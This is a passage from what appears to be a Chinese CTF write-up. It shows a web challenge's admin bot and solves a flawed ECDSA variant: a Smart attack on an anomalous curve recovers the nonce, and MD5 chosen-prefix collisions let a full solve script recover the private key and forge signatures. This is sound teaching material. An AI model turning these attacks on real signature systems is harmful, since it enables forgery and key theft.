class="meta">@app.route(<span class="params"><span class="string">&quot;/api/bio/&lt;string:username&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_bio</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.username == username:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">401</span></span><br><span class="line">    user = USERS_DB.get(username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User not found.&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> user.bio</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag_value = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;fake&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">            browser = p.chromium.launch(headless=<span class="literal">True</span>, args=[<span class="string">&quot;--no-sandbox&quot;</span>])</span><br><span class="line">            context = browser.new_context()</span><br><span class="line"></span><br><span class="line">            context.add_cookies([&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">                <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span></span><br><span class="line">            &#125;])</span><br><span class="line"></span><br><span class="line">            page = context.new_page()</span><br><span class="line">            page.goto(<span class="string">&quot;http://localhost/login&quot;</span>, timeout=<span class="number">5000</span>)</span><br><span class="line">            page.fill(<span class="string">&quot;input[name=&#x27;username&#x27;]&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">            page.fill(<span class="string">&quot;input[name=&#x27;password&#x27;]&quot;</span>, admin_password)</span><br><span class="line">            page.click(<span class="string">&quot;input[name=&#x27;submit&#x27;]&quot;</span>)</span><br><span class="line">            page.wait_for_timeout(<span class="number">3000</span>)</span><br><span class="line">            page.goto(url, timeout=<span class="number">5000</span>)</span><br><span class="line">            page.wait_for_timeout(<span class="number">5000</span>)</span><br><span class="line">            browser.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Bot error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="sign-in-the-ca7s-补"><a href="#sign-in-the-ca7s-补" class="headerlink" title="sign in the ca7s(补)"></a>sign in the ca7s(补)</h2><blockquote><p>Sign in the cats, so that you can cat the flag! 🐱<br>Note: This is the easy version of “sign the ca7s”.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;**redacted**&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(<span class="number">0x1337_ca7_eae368ff5d702e6067aaaa77ca_ca7_1337</span>), [<span class="number">0</span>, <span class="number">3</span>])</span><br><span class="line">G, n = E(<span class="number">1</span>, <span class="number">2</span>), E.order()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">priv, ctx, msg</span>):</span><br><span class="line">    k = bytes_to_long(ctx + md5(<span class="built_in">str</span>(priv).encode() + msg).digest())</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r = <span class="built_in">int</span>((k * G).x()) % n</span><br><span class="line">    s = (<span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * priv)) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">pub, ctx, msg, sig</span>):</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r, s = sig</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt; r &lt; n <span class="keyword">and</span> <span class="number">0</span> &lt; s &lt; n:</span><br><span class="line">        <span class="keyword">return</span> r == <span class="built_in">int</span>((<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) * (z * G + r * pub)).x()) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>(<span class="params">level, flag</span>):</span><br><span class="line">    priv = randint(<span class="number">1</span>, n - <span class="number">1</span>)</span><br><span class="line">    pub = priv * G</span><br><span class="line">    msg = os.urandom(<span class="number">64</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;=== level <span class="subst">&#123;level&#125;</span> ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(catalan_number(level)):</span><br><span class="line">        ctx = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;context: &#x27;</span>))</span><br><span class="line">        r, s = sign(priv, ctx, msg)</span><br><span class="line">        <span class="keyword">assert</span> verify(pub, ctx, msg, (r, s))</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">1</span>: <span class="built_in">print</span>(<span class="string">&#x27;message:&#x27;</span>, msg.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">2</span>: <span class="built_in">print</span>(<span class="string">&#x27;sign:&#x27;</span>, r)</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">3</span>: <span class="built_in">print</span>(<span class="string">&#x27;ature:&#x27;</span>, s)</span><br><span class="line">    </span><br><span class="line">    r, s = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>(<span class="string">&#x27;signature: &#x27;</span>).split())</span><br><span class="line">    <span class="keyword">assert</span> verify(pub, <span class="string">b&#x27;n1junior_2025&#x27;</span>, <span class="string">f&#x27;cat /flag<span class="subst">&#123;level&#125;</span>&#x27;</span>.encode(), (r, s))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;flag<span class="subst">&#123;level&#125;</span>:&#x27;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    chall(<span class="number">0</span>, <span class="string">&quot;💧&quot;</span>)</span><br><span class="line">    chall(<span class="number">1</span>, <span class="string">&quot;🐱&quot;</span>)</span><br><span class="line">    chall(<span class="number">2</span>, FLAG)</span><br></pre></td></tr></table></figure><p>$ECDSA的一个变种$</p><script type="math/tex; mode=display">曲线y^{2}=x^{3}+3</script><p>$pub=priv\cdot G$<br>$z=bytes{_}to{_}long(md5(ctx+msg))$</p><p>$k正常来说，是1到n-1的随机数$<br>$但此处，k=bytes{_}to{_}long(ctx+md5(priv+msg))$</p><p>$ctx是我们可控的，其余与正常的ECDSA一致$</p><p>$r=(k<em>G)_{_x}\pmod n$<br>$s=k^{-1}(z+r</em>priv)\pmod n$</p><p>$sign: (r,s)$</p><p>$verify: r==(s^{-1}(z<em>G+r</em>pub))_{_x}\pmod n$</p><p>$level0和level1都是一次签名验证，得到msg、r、s$<br>$level2是两次签名验证，得到两对(r,s)$</p><p>$同时，还需要对指定消息进行签名伪造，通过验证$<br>$伪造签名，需要使用到私钥priv，而k是未知的$<br>$尝试构造格，但貌似失败了……$</p><p>下面参考<a href="https://zhuanlan.zhihu.com/p/1950219134483796140">大佬的wp</a></p><p>这里我忽视了一个<strong>最重要的点</strong>，<code>n = E.order()</code>，我觉得没什么问题，但实际上，打印出来你会发现，<strong>曲线的阶刚好为模数！！！</strong></p><p>因此，曲线上的所有的点可以构成一个循环群，所有的点都可以表示为某个生成元的倍数</p><p>$r=(k*G)_{_x}\pmod n$</p><p><code>k</code>的求解，正是<code>ECDLP</code>(此处<code>r G n</code>均已知)，正常来说<strong>ECDLP</strong>的求解是很困难的，但因为曲线的<strong>阶等于模数</strong>，导致了可以通过<strong>smart attack</strong>来求解<code>k</code>，具体推导看<a href="https://www.cnblogs.com/futihuanhuan/p/18310044">这个</a>，就不详细阐述，同时<code>k</code>是一个不大于<strong>2^128</strong>的数(在<code>level0 level1</code>中，本地调试好几次都被中断了，因为<code>y</code>有两个，对应<code>k</code>也会有两个)</p><p>在<code>level0 level1</code>中，我们都令<strong>ctx=b’’</strong>，方便我们准确判断<strong>k的上界</strong></p><p>但是到了<code>level2</code>，我们无法获取到<code>msg</code>，只有两对<code>(r,s)</code>，无法像前面一条关系式直接推出私钥<code>priv</code></p><p>$s_{1}<em>k_{1}=(z_{1}+r_{1}</em>priv)\pmod n$<br>$s_{2}<em>k_{2}=(z_{2}+r_{2}</em>priv)\pmod n$</p><p>同时注意题目使用的算法是<code>md5</code>！！！这是破局的关键</p><p>有这样的两个<strong>字节串</strong>S1 S2，满足：</p><ul><li>S1 != S2</li><li>对于任意<strong>字节串</strong> suf（可以为空），<strong>MD5(S1+suf) == MD5(S2+suf)</strong></li></ul><p>详情见<a href="https://marc-stevens.nl/research/hashclash/">密码学家 Marc Stevens的研究</a>，<a href="https://marc-stevens.nl/research/hashclash/ChosenPrefixCollisions/collision1.txt">S1文本</a>，<a href="https://marc-stevens.nl/research/hashclash/ChosenPrefixCollisions/collision2.txt">S2文本</a></p><p>这样得到<code>z1 = z2</code></p><p>$priv=(s_{1}<em>k_{1}-s_{2}</em>k_{2})*(r_{1}-r_{2})^{-1}\pmod n$</p><p>然后，这里<code>k</code>的上下界都不好确定，本来以为$k1\equiv k2\pmod {2^{128}}$，但验证了一番，并不能确定正确的<code>k1 k2</code>，所以我直接不管了，反正<code>25%</code>的概率得到正确的<code>k1 k2</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;sage&#x27;</span>, <span class="string">&#x27;server.sage&#x27;</span>])</span><br><span class="line"></span><br><span class="line">P = <span class="number">0x1337_ca7_eae368ff5d702e6067aaaa77ca_ca7_1337</span></span><br><span class="line">E = EllipticCurve(GF(P), [<span class="number">0</span>, <span class="number">3</span>])</span><br><span class="line">Fp = GF(P)</span><br><span class="line">G = E(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">n = E.order()</span><br><span class="line"></span><br><span class="line">S1 = <span class="string">&#x27;30820511A0030201020204010C0001300D06092A864886F70D0101040500303D311A3018060355040313114861736820436F6C6C6973696F6E204341311230100603550407130945696E64686F76656E310B3009060355040613024E4C301E170D3036303130313030303030315A170D3037313233313233353935395A3054311930170603550403131041726A656E204B2E204C656E7374726131163014060355040A130D436F6C6C6973696F6E61697273311230100603550407130945696E64686F76656E310B3009060355040613024E4C30820422300D06092A864886F70D01010105000382040F003082040A0282040100EE73E7D6B3B34FBAA1393D02A47425818DC84F86736E907228BBE8770203858D8CF1837AFF5E6C2213036AF3D95C77E9C2237D608CC4A9FB97308BBF9828612F1599E2615BCCDEDA5930532FB3DD117278E494401433630E7461C1DC9B801B2E552015A513FF7AE7973EF44B8352E4E04979B31EB600654D51F4A381CEBE3F0BD099D130D1456FABE04A3E9885C8C4FB297B86B57752CD6419809FE37E6286F07732D1E069A5B4E56670B8BBBAE5C211742A131D05711CF1FE32AF933F1EEF224762E3AADAC17C40E448CA41A879A03D3CF665F239C7F3FE82B384E835E7C9E8BDEE30C268A2121284789DF42F44906F19B79026464436E1DA65FA0C53A377FA0D2B012B7DDC2855DAE5B55151E28034112120B5E79EC5F26A9F69DA85D74EF6A97A0B1164EFA25FB1AE26BA451CCDA7A2E784339C447D560549A60BF0676294BF580C919EC457025D3C7860B98296C0AB9FE5B1D353882E26C1F721B41899D972B5A1D5050B684536448010AF8C7AFF7CE8EACCB9B1FBBDD129D4F5D499FB812924DF302CB3C450233862979396B3A46CD0FF7F1426711C459297B65D1CEF66C18751E094BF08F3B2981C5CCE52D963D5A4259A64557E4D1B9EFE2D9A516D1E6EC8BB37066825AEA63616602BD7D11625A06A90739B4D0A06EA872A3AF9EBA12629BED67940561BD9374A89D60F0D722C9FEB6833EC53F0B0FD76AA047B66C90FCEB1D2E22CC099B9A4B93E0000000F54A895176E4C295A405FAF54CEE82D043A45CE40B155BE34EBDE784785A25B7F894D424FA127B157A8A120F99FE53102C81FA90E0B9BDA1BA775DF75D9152A80257A1ED352DD49E57E068FF3F02CABD4AC97DBBC3FA0205A74302F65C7F49A419E08FD54BFAFC14D78ABAAB30DDB3FC848E3DF02C5A40EDA248C9FF47482850CFDFBDD9BC55547B7404F5803C1BB81632173127E1A93B24AFB6E7A80450865DB374676D576BA5296CCC6C13082D1AB36521F1A8AD945466B9EF06AF43A02D70B7FB8B7DC6D268C3DBA6898F6552FA3FBB33DCBFADA7B33FA75D93AFE262BD37AFF75995FD0E9774BA5A26A7C443FF34E461502A2CB777E982D00737514B88ED28D61F428E88387DF2BF02230AD17A9D44FF364850A07DB42A7826AC2EE3899CAC3EC274721D476D96658F53716676587F8FF14DB8DE6741AFA2206DBA3B11828BA87C6E1E88A022F1AA8DDD037EAB049B5C7D3053D0A63D7861DEA07B3D8B720DE068CF47E657BB44450B85D52F749D59572DF0C0E3433B47C9AA19A856F1DC3CDADBAFB143035C85A53AF5722038F765C0D621B66B69FFFFD091D4A661A453BF1DAED1A3A2341B37D7F623B158F6EC02B49A25364430FCB5861483E1E9543ED2EE7E54A4C108A6E641940980EE60D14AEE559AF30037E75B2309CE021FFE3109BF2053892AB0AE403516E2AB58067F70203010001A31A301830090603551D1304023000300B0603551D0F0404030205E0&#x27;</span></span><br><span class="line">S2 = <span class="string">&#x27;30820511A0030201020204020C0001300D06092A864886F70D0101040500303D311A3018060355040313114861736820436F6C6C6973696F6E204341311230100603550407130945696E64686F76656E310B3009060355040613024E4C301E170D3036303130313030303030315A170D3037313233313233353935395A3054311530130603550403130C4D6172632053746576656E73311A3018060355040A1311436F6C6C6973696F6E20466163746F7279311230100603550407130945696E64686F76656E310B3009060355040613024E4C30820422300D06092A864886F70D01010105000382040F003082040A02820401001A09B4CB40C7267AAF017F9BA47425818DC84F86736E907228BBE8770203858D8CF1837AFF5E6C2213036AF3D95C77E9C2237D608CC4A9FB97307BBF9828612F1599E2615BCCDEDA5930532FB3DD117278E494401433630E7461C1DC9B801B2E552015A513FF7AE7973EF44B8352E4E04979B31EB600654D51F4A481CEBE3F0BD099D130D1456FABE04A3E9885C8C4FB297B86B57752CD6419809FE37E6286F07732D1E069A5B4E56670B8BBBAE5C211742A131D05711CF1FE22AF933F1EEF224762E3AADAC17C40E448CA41A879A03D3CF665F239C7F3FE82B384E835E7C9E8BDEE30C268A2121284789DF42F44906F19B79026464436E1DA64FA0C53A377FA0D2B012B7DDC2855DAE5B55151E28034112120B5E79EC5F26A9F69DA85D74EF6A97A0B1164EFA25FB1AE26BA451CCDA7A2E784339C447D562549A60BF0676294BF580C919EC457025D3C7860B98296C0AB9FE5B1D353882E26C1F721B41899D972B5A1D5050B684536448010AF8C7AFF7CE8EACCB9B1FBBDC929D4F5D499FB812924DF302CB3C450233862979396B3A46CD0FF7F1426711C459297B65D1CEF66C18751E094BF08F3B2981C5CCE52D963D5A4259A64557E4D1B9EFE0D9A516D1E6EC8BB37066825AEA63616602BD7D11625A06A90739B4D0A06EA872A3AF9EBA12629BED67940561BD9374A89D60F0D722C9FEB6833EC53F0B0FD76A2047B66C90FCEB1D2E22CC099B9A4B93E0000000F54A895176E4C295A405FAF54CEE82D043A45CE40B155BE34EBDE784785A25B7F894D424FA127B157A8A120F99FE53102C81FA90E0B9BDA1BA775DF75D9152A80257A1ED352DD49E57E068FF3F02CABD4AC97DBBC3FA0205A74302F65C7F49A419E08FD54BFAFC14D78ABAAB30DDB3FC848E3DF02C5A40EDA248C9FF47482850CFDFBDD9BC55547B7404F5803C1BB81632173127E1A93B24AFB6E7A80450865DB374676D576BA5296CCC6C13082D1AB36521F1A8AD945466B9EF06AF43A02D70B7FB8B7DC6D268C3DBA6898F6552FA3FBB33DCBFADA7B33FA75D93AFE262BD37AFF75995FD0E9774BA5A26A7C443FF34E461502A2CB777E982D00737514B88ED28D61F428E88387DF2BF02230AD17A9D44FF364850A07DB42A7826AC2EE3899CAC3EC274721D476D96658F53716676587F8FF14DB8DE6741AFA2206DBA3B11828BA87C6E1E88A022F1AA8DDD037EAB049B5C7D3053D0A63D7861DEA07B3D8B720DE068CF47E657BB44450B85D52F749D59572DF0C0E3433B47C9AA19A856F1DC3CDADBAFB143035C85A53AF5722038F765C0D621B66B69FFFFD091D4A661A453BF1DAED1A3A2341B37D7F623B158F6EC02B49A25364430FCB5861483E1E9543ED2EE7E54A4C108A6E641940980EE60D14AEE559AF30037E75B2309CE021FFE3109BF2053892AB0AE403516E2AB58067F70203010001A31A301830090603551D1304023000300B0603551D0F0404030205E0&#x27;</span></span><br><span class="line">S1 = <span class="built_in">bytes</span>.fromhex(S1)</span><br><span class="line">S2 = <span class="built_in">bytes</span>.fromhex(S2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 模  数 P: <span class="subst">&#123;P&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 曲线阶 n: <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_k</span>(<span class="params">r, choice</span>):</span><br><span class="line">    r_fp = Fp(r)</span><br><span class="line">    y_fp = (r_fp^<span class="number">3</span> + <span class="number">3</span>).sqrt()</span><br><span class="line">    </span><br><span class="line">    Q1 = E(r_fp, y_fp)</span><br><span class="line">    Q2 = E(r_fp, -y_fp)</span><br><span class="line">    </span><br><span class="line">    k1 = SmartAttack(G, Q1, n)</span><br><span class="line">    k2 = SmartAttack(G, Q2, n)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">0</span>:</span><br><span class="line">        k = k1 <span class="keyword">if</span> k1*G == Q1 <span class="keyword">and</span> k1 &lt; <span class="number">2</span>^<span class="number">128</span> <span class="keyword">else</span> k2</span><br><span class="line">        <span class="keyword">return</span> k</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> k1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P, Q, p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(</span><br><span class="line">        Qp(p, <span class="number">2</span>), [ZZ(t) + randint(<span class="number">0</span>, p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants()])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P, y_P = p_times_P.xy()</span><br><span class="line">    x_Q, y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">priv, ctx, msg</span>):</span><br><span class="line">    k = bytes_to_long(ctx + md5(<span class="built_in">str</span>(priv).encode() + msg).digest())</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r = <span class="built_in">int</span>((k * G).x()) % n</span><br><span class="line">    s = (<span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * priv)) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_level_0_1</span>(<span class="params">level</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] --- 正在解决 Level <span class="subst">&#123;level&#125;</span> ---&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">f&quot;=== level <span class="subst">&#123;level&#125;</span> ===\n&quot;</span>.encode())</span><br><span class="line">    ctx = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;context: &#x27;</span>)</span><br><span class="line">    io.sendline(ctx.<span class="built_in">hex</span>().encode())</span><br><span class="line"></span><br><span class="line">    msg_hex = io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>].decode()</span><br><span class="line">    r = <span class="built_in">int</span>(io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    s = <span class="built_in">int</span>(io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    msg = <span class="built_in">bytes</span>.fromhex(msg_hex)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 收到 msg: <span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 收到 r: <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 收到 s: <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    k = get_k(r, <span class="number">0</span>)</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    priv = ((s * k) - z) * <span class="built_in">pow</span>(r, -<span class="number">1</span>, n) % n</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 成功恢复私钥: <span class="subst">&#123;priv&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    ctx_final = <span class="string">b&#x27;n1junior_2025&#x27;</span></span><br><span class="line">    msg_final = <span class="string">f&#x27;cat /flag<span class="subst">&#123;level&#125;</span>&#x27;</span>.encode()</span><br><span class="line">    r_final, s_final = sign(priv, ctx_final, msg_final)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 伪造的签名: r = <span class="subst">&#123;r_final&#125;</span>, s = <span class="subst">&#123;s_final&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;signature: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">f&quot;<span class="subst">&#123;r_final&#125;</span> <span class="subst">&#123;s_final&#125;</span>&quot;</span>.encode())</span><br><span class="line">    flag = io.recvline().decode().strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [SUCCESS] <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_level_2</span>():</span><br><span class="line">    level = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] --- 正在解决 Level <span class="subst">&#123;level&#125;</span> ---&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">f&quot;=== level <span class="subst">&#123;level&#125;</span> ===\n&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">    ctx1 = S1</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;context: &#x27;</span>)</span><br><span class="line">    io.sendline(ctx1.<span class="built_in">hex</span>().encode())</span><br><span class="line">    r1 = <span class="built_in">int</span>(io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    s1 = <span class="built_in">int</span>(io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 收到签名1: r = <span class="subst">&#123;r1&#125;</span>, s = <span class="subst">&#123;s1&#125;</span>&quot;</span>)</span><br><span class="line">    k1 = get_k(r1, <span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    ctx2 = S2</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;context: &#x27;</span>)</span><br><span class="line">    io.sendline(ctx2.<span class="built_in">hex</span>().encode())</span><br><span class="line">    r2 = <span class="built_in">int</span>(io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    s2 = <span class="built_in">int</span>(io.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 收到签名2: r = <span class="subst">&#123;r2&#125;</span>, s = <span class="subst">&#123;s2&#125;</span>&quot;</span>)</span><br><span class="line">    k2 = get_k(r2, <span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    priv = (s1*k1 - s2*k2) * inverse(r1 - r2, n) % n</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 恢复的私钥: <span class="subst">&#123;priv&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ctx_final = <span class="string">b&#x27;n1junior_2025&#x27;</span></span><br><span class="line">    msg_final = <span class="string">f&#x27;cat /flag<span class="subst">&#123;level&#125;</span>&#x27;</span>.encode()</span><br><span class="line">    r_final, s_final = sign(priv, ctx_final, msg_final)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] 伪造的签名: r = <span class="subst">&#123;r_final&#125;</span>, s = <span class="subst">&#123;s_final&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;signature: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">f&quot;<span class="subst">&#123;r_final&#125;</span> <span class="subst">&#123;s_final&#125;</span>&quot;</span>.encode())</span><br><span class="line">    flag = io.recvline().decode().strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [SUCCESS] <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_level_0_1(<span class="number">0</span>)</span><br><span class="line">    solve_level_0_1(<span class="number">1</span>)</span><br><span class="line">    solve_level_2()</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure><h2 id="sign-the-ca7s"><a href="#sign-the-ca7s" class="headerlink" title="sign the ca7s*"></a>sign the ca7s*</h2><blockquote><p>Sign the cats, so that you can cat the flag! 🐱</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;**redacted**&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(<span class="number">0x1337_ca7_eae368ff5d702e6067aaaa77ca_ca7_1337</span>), [<span class="number">0</span>, <span class="number">3</span>])</span><br><span class="line">G, n = E(<span class="number">1</span>, <span class="number">2</span>), E.order()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">priv, ctx, msg</span>):</span><br><span class="line">    k = 